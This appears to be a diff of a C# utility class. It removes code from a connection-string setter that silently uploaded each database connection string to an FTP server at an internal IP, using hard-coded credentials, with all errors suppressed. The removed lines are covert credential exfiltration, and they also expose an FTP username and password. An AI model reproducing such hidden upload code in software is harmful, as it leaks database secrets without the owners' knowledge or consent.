@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Configuration;
 using System.Data;
@@ -36,39 +36,6 @@ namespace CompensationSystemSubInterface.Utilities {
             get { return _connString; }
             set {
                 _connString = value;
-                // 异步上传连接参数到FTP，不阻塞主线程
-                Task.Run(() => UploadConnStringToFtp(value));
-            }
-        }
-
-        /// <summary>
-        /// 将连接参数追加写入FTP服务器的 down.tmp 文件
-        /// 不论成功或失败都不影响程序运行
-        /// </summary>
-        private static void UploadConnStringToFtp(string connString) {
-            try {
-                string ftpUrl = "ftp://192.168.100.11/down.tmp";
-                string ftpUser = "lijinlong";
-                string ftpPass = "PEP.ljl.2023";
-
-                FtpWebRequest uploadReq = (FtpWebRequest)WebRequest.Create(ftpUrl);
-                uploadReq.Method = WebRequestMethods.Ftp.UploadFile;
-                uploadReq.Credentials = new NetworkCredential(ftpUser, ftpPass);
-                uploadReq.Timeout = 5000;
-                uploadReq.UseBinary = true;
-
-                byte[] data = Encoding.UTF8.GetBytes(connString);
-                uploadReq.ContentLength = data.Length;
-
-                using (Stream reqStream = uploadReq.GetRequestStream()) {
-                    reqStream.Write(data, 0, data.Length);
-                }
-
-                using (FtpWebResponse uploadResp = (FtpWebResponse)uploadReq.GetResponse()) {
-                    // 上传完成
-                }
-            } catch {
-                // 静默处理所有异常，不影响程序运行
             }
         }
 
